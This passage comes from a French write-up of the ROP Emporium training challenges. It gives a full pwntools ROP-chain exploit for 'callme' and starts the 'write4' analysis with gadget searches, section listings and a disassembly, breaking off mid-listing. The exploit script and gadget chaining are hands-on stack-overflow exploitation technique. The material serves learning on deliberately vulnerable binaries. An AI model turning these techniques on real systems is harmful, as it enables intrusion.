<p>Et on voit que le programme a <code>segfault</code>&hellip; Pour rappel je suis sous <strong>Ubuntu 22.04</strong> donc mon syst√®me est affect√© par les probl√®mes de <em>stack alignment</em>. On va donc ajouter un ret juste apr√®s notre padding, qu&rsquo;on peut trouver avec ROPgadget</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>ROPgadget <span style="color:#f92672">--</span>binary callme
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Gadgets information
</span></span><span style="display:flex;"><span><span style="color:#f92672">============================================================</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;...&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004006be</span> : ret
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;...&gt;</span>
</span></span><span style="display:flex;"><span>Unique gadgets found: <span style="color:#ae81ff">110</span>
</span></span></code></pre></div><h2 id="final-payload-2">
  Final Payload
  <a href="#final-payload-2" class="h-anchor" aria-hidden="true">#</a>
</h2>
<p>Compl√©tons notre exploit avec ce ret:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> binary <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./callme&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> process()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recv()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>padding <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x20</span>
</span></span><span style="display:flex;"><span>rbp <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;B&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x8</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>ret <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x00000000004006be</span>)
</span></span><span style="display:flex;"><span>pop_rdi_rsi_rdx <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x000000000040093c</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>callme_one <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x00400720</span>)
</span></span><span style="display:flex;"><span>callme_two <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x00400740</span>)
</span></span><span style="display:flex;"><span>callme_three <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x004006f0</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>arg1 <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0xdeadbeefdeadbeef</span>)
</span></span><span style="display:flex;"><span>arg2 <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0xcafebabecafebabe</span>)
</span></span><span style="display:flex;"><span>arg3 <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0xd00df00dd00df00d</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> padding <span style="color:#f92672">+</span> rbp
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># ret gadget</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> ret
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># On met les arguments dans les registres, puis on jump √† la fonction callme_one</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> pop_rdi_rsi_rdx
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> arg1 <span style="color:#f92672">+</span> arg2 <span style="color:#f92672">+</span> arg3
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> callme_one
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Pareil, on remet les arguments dans les registres et cette fois on jump √† callme_two</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> pop_rdi_rsi_rdx
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> arg1 <span style="color:#f92672">+</span> arg2 <span style="color:#f92672">+</span> arg3
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> callme_two
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># ...</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> pop_rdi_rsi_rdx
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> arg1 <span style="color:#f92672">+</span> arg2 <span style="color:#f92672">+</span> arg3
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> callme_three
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;Flag:&#34;</span>,p<span style="color:#f92672">.</span>recvall()<span style="color:#f92672">.</span>split(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)[<span style="color:#ae81ff">3</span>]<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;utf-8&#39;</span>))
</span></span></code></pre></div><p>Et cette fois, il devrait fonctionner:</p>
<p><img src="https://user-images.githubusercontent.com/77807503/212548977-7d83ef59-bf5a-497e-b655-9011e98b84d5.png" alt="2023-01-15-153142_994x552_scrot"></p>
<p>Parfait, on a r√©ussi √† r√©cup√©rer le flag</p>
<blockquote>
<p>Note: Nous ne sommes pas en x86_x64 donc nous n&rsquo;aurions pas d√ª avoir besoin de doubler les valeurs des arguments comme dit dans la consigne mais √ßa ne fonctionnait pas sans&hellip;</p>
</blockquote>
<hr>
<h1 id="write4">
  write4
  <a href="#write4" class="h-anchor" aria-hidden="true">#</a>
</h1>
<h2 id="note-3">
  Note
  <a href="#note-3" class="h-anchor" aria-hidden="true">#</a>
</h2>
<p>Quatri√®me exo de ROPEmporium, il introduit une nouvelle m√©chanique et nous pousse √† utiliser un nouveau type de gadget, tr√®s int√©ressant</p>
<p>Si j&rsquo;ai fait des erreurs, n&rsquo;h√©sitez pas √† me contacter sur <a href="https://discord.com/users/254689803822563348">discord</a> pour me le dire.</p>
<p>Si vous ne comprenez pas quelque chose, je vous invite √† commencer par <a href="#ret2win">le premier exercice</a>.</p>
<h2 id="description">
  Description
  <a href="#description" class="h-anchor" aria-hidden="true">#</a>
</h2>
<pre tabindex="0"><code>On completing our usual checks for interesting strings and symbols in this binary we&#39;re confronted with the stark truth that our favourite string &#34;/bin/cat flag.txt&#34; is not present this time. 
Although you&#39;ll see later that there are other ways around this problem, such as resolving dynamically loaded libraries and using the strings present in those, we&#39;ll stick to the challenge goal which is learning how to get data into the target process&#39;s virtual address space via the magic of ROP.

Important!
A PLT entry for a function named print_file() exists within the challenge binary, simply call it with the name of a file you wish to read (like &#34;flag.txt&#34;) as the 1st argument. 
</code></pre><h2 id="file-information-3">
  File information
  <a href="#file-information-3" class="h-anchor" aria-hidden="true">#</a>
</h2>
<p>Avant de commencer √† regarder dans l&rsquo;executable, il faut savoir √† quoi on s&rsquo;attaque, on va utiliser <code>file</code> pour avoir des informations sur le fichier, puis <code>checksec</code> pour voir les √©ventuelles s√©curit√©es avec lesquelles il a √©t√© compil√©</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-css" data-lang="css"><span style="display:flex;"><span><span style="color:#f92672">file</span> <span style="color:#f92672">write4</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">write4</span><span style="color:#f92672">:</span> <span style="color:#f92672">ELF</span> <span style="color:#f92672">64-bit</span> <span style="color:#f92672">LSB</span> <span style="color:#f92672">executable</span><span style="color:#f92672">,</span> <span style="color:#f92672">x86-64</span><span style="color:#f92672">,</span> <span style="color:#f92672">version</span> <span style="color:#f92672">1</span> <span style="color:#f92672">(</span><span style="color:#f92672">SYSV</span><span style="color:#f92672">),</span> <span style="color:#f92672">dynamically</span> <span style="color:#f92672">linked</span><span style="color:#f92672">,</span> <span style="color:#f92672">interpreter</span> <span style="color:#f92672">/</span><span style="color:#f92672">lib64</span><span style="color:#f92672">/</span><span style="color:#f92672">ld-linux-x86-64</span>.<span style="color:#a6e22e">so</span>.<span style="color:#a6e22e">2</span><span style="color:#f92672">,</span> <span style="color:#f92672">for</span> <span style="color:#f92672">GNU</span><span style="color:#f92672">/</span><span style="color:#f92672">Linux</span> <span style="color:#f92672">3</span>.<span style="color:#a6e22e">2</span>.<span style="color:#a6e22e">0</span><span style="color:#f92672">,</span> <span style="color:#f92672">BuildID</span><span style="color:#f92672">[</span><span style="color:#f92672">sha1</span><span style="color:#f92672">]=</span><span style="color:#f92672">4cbaee0791e9daa7dcc909399291b57ffaf4ecbe</span><span style="color:#f92672">,</span> <span style="color:#f92672">not</span> <span style="color:#f92672">stripped</span>
</span></span></code></pre></div><p>On va donc s&rsquo;attaquer √† un executable en 64bit, link√© dynamiquement et qui n&rsquo;est pas stripp√©</p>
<p>Maintenant le <code>checksec</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-css" data-lang="css"><span style="display:flex;"><span><span style="color:#f92672">checksec</span> <span style="color:#f92672">write4</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[*]</span> <span style="color:#e6db74">&#39;/home/conflict/ropemporium/write4_x64/write4&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">Arch</span><span style="color:#f92672">:</span>     <span style="color:#f92672">amd64-64-little</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">RELRO</span><span style="color:#f92672">:</span>    <span style="color:#f92672">Partial</span> <span style="color:#f92672">RELRO</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">Stack</span><span style="color:#f92672">:</span>    <span style="color:#f92672">No</span> <span style="color:#f92672">canary</span> <span style="color:#f92672">found</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">NX</span><span style="color:#f92672">:</span>       <span style="color:#f92672">NX</span> <span style="color:#f92672">enabled</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">PIE</span><span style="color:#f92672">:</span>      <span style="color:#f92672">No</span> <span style="color:#f92672">PIE</span> <span style="color:#f92672">(</span><span style="color:#f92672">0x400000</span><span style="color:#f92672">)</span>
</span></span></code></pre></div><p>Comme pour le pr√©c√©dent, <strong>NX</strong> est activ√© donc pas de shellcode, mais ce n&rsquo;est pas un probl√®me puisque la description de l&rsquo;exercice nous indique exactement quoi faire</p>
<h2 id="exploitation-3">
  Exploitation
  <a href="#exploitation-3" class="h-anchor" aria-hidden="true">#</a>
</h2>
<p>On va le lancer pour voir ce qu&rsquo;il fait concr√®tement:</p>
<p><img src="https://user-images.githubusercontent.com/77807503/213875956-5f7e3f8e-3d1e-42a1-b4f6-53168ef66fb4.png" alt="2023-01-21-151701_1046x476_scrot"></p>
<p>On voit que si on entre un nombre √©lev√© de bytes dans l&rsquo;input le programme plante (<code>segfault</code>), ce qui veut dire qu&rsquo;on a commenc√© √† overwrite des registres.</p>
<p>Cette fois pas besoin de d√©sassembler les fonctions puisqu&rsquo;on sait exactement ce qu&rsquo;il faut faire, on peut commencer √† ressembler les √©lements n√©cessaires pour construire notre payload.</p>
<p>Commen√ßons par regarder les sections de l&rsquo;executable pour en trouver une dans laquelle on va pouvoir √©crire:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>readelf <span style="color:#f92672">-</span>S write4                                                                  
</span></span><span style="display:flex;"><span>There are <span style="color:#ae81ff">29</span> section headers, starting at offset <span style="color:#ae81ff">0x1980</span>:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Section Headers:
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;...&gt;</span>
</span></span><span style="display:flex;"><span>  [<span style="color:#ae81ff">23</span>] <span style="color:#f92672">.</span>data             PROGBITS         <span style="color:#ae81ff">0000000000601028</span>  <span style="color:#ae81ff">00001028</span>
</span></span><span style="display:flex;"><span>       <span style="color:#ae81ff">0000000000000010</span>  <span style="color:#ae81ff">0000000000000000</span>  WA       <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">8</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;...&gt;</span>
</span></span></code></pre></div><p>On voit que <code>.data</code> a les flags <strong>W</strong> et <strong>A</strong> qui correspondent √† <strong>WRITE</strong> et <strong>ALLOCATE</strong>  donc on pourra √©crire dans cette sections, gardons son adresse de c√¥t√© (<code>0x00601028</code>)</p>
<p>Maintenant qu&rsquo;on sait <strong>o√π</strong> on va √©crire, il faut savoir <strong>comment</strong> on va le faire. Pour cela, on va avoir besoin de deux gadgets:</p>
<ul>
<li>Le premier gadget devra <code>pop</code> deux registres</li>
<li>Le second devra mettre la valeur de l&rsquo;un dans le pointeur de l&rsquo;autre</li>
</ul>
<p>Concr√®tement, l&rsquo;id√©e va √™tre de mettre dans un premier registre l&rsquo;adresse de <code>.data</code> et dans un deuxi√®me notre string <code>&quot;/bin/cat flag.txt&quot;</code> . Ensuite, l&rsquo;id√©e sera de mettre le string dans le pointeur du premier registre, soit dans la section <code>.data</code>. Si c&rsquo;est un peu flou pour l&rsquo;instant, vous devriez mieux comprendre avec le code.</p>
<p>Regardons les gadgets pr√©sents dans le binaire avec ROPgadget:</p>
<p>Tout d&rsquo;abord, les <code>pop</code> gadgets:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>ROPgadget <span style="color:#f92672">--</span>binary write4 <span style="color:#f92672">|</span> grep <span style="color:#e6db74">&#34;: pop&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x000000000040068c</span> : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x000000000040068e</span> : pop r13 ; pop r14 ; pop r15 ; ret
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400690</span> : pop r14 ; pop r15 ; ret
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400692</span> : pop r15 ; ret
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400604</span> : pop rbp ; jmp <span style="color:#ae81ff">0x400590</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x000000000040057b</span> : pop rbp ; mov edi, <span style="color:#ae81ff">0x601038</span> ; jmp rax
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x000000000040068b</span> : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x000000000040068f</span> : pop rbp ; pop r14 ; pop r15 ; ret
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400588</span> : pop rbp ; ret
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400693</span> : pop rdi ; ret
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400691</span> : pop rsi ; pop r15 ; ret
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x000000000040068d</span> : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
</span></span></code></pre></div><p>On voit un <code>pop r14 ; pop r15 ; ret</code> √† l&rsquo;adresse <code>0x00400690</code>, exactement ce qu&rsquo;il nous faut</p>
<p>Maintenant il faut esp√©rer qu&rsquo;il existe un gadget <code>mov</code> avec ces deux registres, et sans trop de contrainte</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>ROPgadget <span style="color:#f92672">--</span>binary write4 <span style="color:#f92672">|</span> grep <span style="color:#e6db74">&#34;: mov&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x000000000040061c</span> : mov ah, <span style="color:#ae81ff">6</span> ; add al, bpl ; jmp <span style="color:#ae81ff">0x400621</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004005e2</span> : mov byte ptr [rip <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x200a4f</span>], <span style="color:#ae81ff">1</span> ; pop rbp ; ret
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400629</span> : mov dword ptr [rsi], edi ; ret
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400610</span> : mov eax, <span style="color:#ae81ff">0</span> ; pop rbp ; ret
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400602</span> : mov ebp, esp ; pop rbp ; jmp <span style="color:#ae81ff">0x400590</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x000000000040057c</span> : mov edi, <span style="color:#ae81ff">0x601038</span> ; jmp rax
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400628</span> : mov qword ptr [r14], r15 ; ret
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400601</span> : mov rbp, rsp ; pop rbp ; jmp <span style="color:#ae81ff">0x400590</span>
</span></span></code></pre></div><p>On voit un <code>mov qword ptr [r14], r15 ; ret</code> √† l&rsquo;adresse <code>0x00400628</code>, encore une fois exactement ce qu&rsquo;il nous faut.</p>
<blockquote>
<p>L&rsquo;instruction <code>mov</code> d√©place le cotenu du second registre dans le premier, en l&rsquo;occurence ici, il d√©place la valeur de r15 dans l&rsquo;adresse dans r14 (gr√¢ce au <code>qword ptr</code>)</p>
</blockquote>
<p>Mais il nous manque encore un gadget! Si on regarde attentivement la description du challenge, on voit qu&rsquo;il existe un fonction <code>print_file()</code> qui prend en argument le nom d&rsquo;un fichier. Le string qu&rsquo;on va √©crire dans <code>.data</code> va donc √™tre <code>flag.txt</code> et plus <code>&quot;/bin/cat flag.txt&quot;</code>.</p>
<blockquote>
<p>Rappel: En 64bit, les fonctions prennent leurs arguments dans les registres <code>rdi</code>, <code>rsi</code>, <code>rdx</code>, <code>rcx</code>&hellip; (vous pouvez trouver la liste des registres <a href="https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/linux-x64-calling-convention-stack-frame">ici</a>).
Donc, en modifiant <code>rdi</code> et en pla√ßant l&rsquo;adresse de <code>.data</code> dedans, la fonction <code>print_file()</code> prendra notre string en premier argument</p>
</blockquote>
<p>Nous avons donc besoin d&rsquo;un <code>pop rdi</code> !</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>ROPgadget <span style="color:#f92672">--</span>binary write4 <span style="color:#f92672">|</span> grep <span style="color:#e6db74">&#34;pop rdi ; ret&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400693</span> : pop rdi ; ret 
</span></span></code></pre></div><p>Parfait, il nous faut maintenant deux derni√®res choses: l&rsquo;adresse de la fonction <code>print_file()</code> et le padding n√©cessaire pour r√©ecrire la sauvegarde de <code>rip</code>.</p>
<blockquote>
<p>Puisque PIE n&rsquo;est pas activ√©, on peut trouver statiquement l&rsquo;adresse de <code>print_file</code>, si il √©tait activ√©, nous aurions d√ª le contourner, par exemple en trouvant la base address de l&rsquo;executable</p>
</blockquote>
<p>Commen√ßons par trouver l&rsquo;adresse de <code>print_file()</code> avec <code>pwndbg</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>pwndbg<span style="color:#f92672">&gt;</span> info functions
</span></span><span style="display:flex;"><span>All defined functions:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Non<span style="color:#f92672">-</span>debugging symbols:
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004004d0</span>  _init
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400500</span>  pwnme<span style="color:#a6e22e">@plt</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400510</span>  print_file<span style="color:#a6e22e">@plt</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400520</span>  _start
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400550</span>  _dl_relocate_static_pie
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400560</span>  deregister_tm_clones
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400590</span>  register_tm_clones
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004005d0</span>  __do_global_dtors_aux
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400600</span>  frame_dummy
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400607</span>  main
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400617</span>  usefulFunction
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400628</span>  usefulGadgets
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400630</span>  __libc_csu_init
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004006a0</span>  __libc_csu_fini
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004006a4</span>  _fini
</span></span></code></pre></div><p>Nickel, maintenant le padding:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>pwndbg<span style="color:#f92672">&gt;</span> disass pwnme
</span></span><span style="display:flex;"><span>Dump of assembler code <span style="color:#66d9ef">for</span> function pwnme:
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c008aa</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">0</span><span style="color:#f92672">&gt;</span>: push   rbp
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c008ab</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">1</span><span style="color:#f92672">&gt;</span>: mov    rbp,rsp
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c008ae</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">4</span><span style="color:#f92672">&gt;</span>: sub    rsp,<span style="color:#ae81ff">0x20</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c008b2</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span>: mov    rax,QWORD PTR [rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0x200727</span>]        <span style="color:#75715e"># 0x7ffff7e00fe0</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c008b9</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">15</span><span style="color:#f92672">&gt;</span>:    mov    rax,QWORD PTR [rax]
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c008bc</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">18</span><span style="color:#f92672">&gt;</span>:    mov    ecx,<span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c008c1</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">23</span><span style="color:#f92672">&gt;</span>:    mov    edx,<span style="color:#ae81ff">0x2</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c008c6</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">28</span><span style="color:#f92672">&gt;</span>:    mov    esi,<span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c008cb</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">33</span><span style="color:#f92672">&gt;</span>:    mov    rdi,rax
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c008ce</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">36</span><span style="color:#f92672">&gt;</span>:    call   <span style="color:#ae81ff">0x7ffff7c00790</span> <span style="color:#f92672">&lt;</span>setvbuf<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c008d3</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">41</span><span style="color:#f92672">&gt;</span>:    lea    rdi,[rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0x106</span>]        <span style="color:#75715e"># 0x7ffff7c009e0</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c008da</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">48</span><span style="color:#f92672">&gt;</span>:    call   <span style="color:#ae81ff">0x7ffff7c00730</span> <span style="color:#f92672">&lt;</span>puts<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c008df</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">53</span><span style="color:#f92672">&gt;</span>:    lea    rdi,[rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0x111</span>]        <span style="color:#75715e"># 0x7ffff7c009f7</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c008e6</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">60</span><span style="color:#f92672">&gt;</span>:    call   <span style="color:#ae81ff">0x7ffff7c00730</span> <span style="color:#f92672">&lt;</span>puts<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c008eb</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">65</span><span style="color:#f92672">&gt;</span>:    lea    rax,[rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x20</span>]
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c008ef</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">69</span><span style="color:#f92672">&gt;</span>:    mov    edx,<span style="color:#ae81ff">0x20</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c008f4</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">74</span><span style="color:#f92672">&gt;</span>:    mov    esi,<span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c008f9</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">79</span><span style="color:#f92672">&gt;</span>:    mov    rdi,rax
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c008fc</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">82</span><span style="color:#f92672">&gt;</span>:    call   <span style="color:#ae81ff">0x7ffff7c00760</span> <span style="color:#f92672">&lt;</span>memset<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c00901</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">87</span><span style="color:#f92672">&gt;</span>:    lea    rdi,[rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0xf8</span>]        <span style="color:#75715e"># 0x7ffff7c00a00</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c00908</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">94</span><span style="color:#f92672">&gt;</span>:    call   <span style="color:#ae81ff">0x7ffff7c00730</span> <span style="color:#f92672">&lt;</span>puts<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c0090d</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">99</span><span style="color:#f92672">&gt;</span>:    lea    rdi,[rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0x115</span>]        <span style="color:#75715e"># 0x7ffff7c00a29</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00007ffff7c00914</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">106</span><span style="color:#f92672">&gt;</span>:   mov    eax,<span style="color:#ae81ff">0x0</span>
